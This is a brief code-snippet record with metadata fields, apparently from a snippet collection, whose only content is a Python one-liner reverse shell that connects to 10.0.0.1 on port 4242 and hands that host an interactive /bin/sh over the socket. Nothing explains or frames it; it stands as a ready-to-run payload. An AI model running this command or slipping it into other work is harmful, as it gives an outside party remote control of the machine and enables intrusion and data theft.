---
id: 81aa18a1-632c-46da-9c58-b323bf2d3321
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.245923+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet 81aa18a1

**Language**: Python

```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```
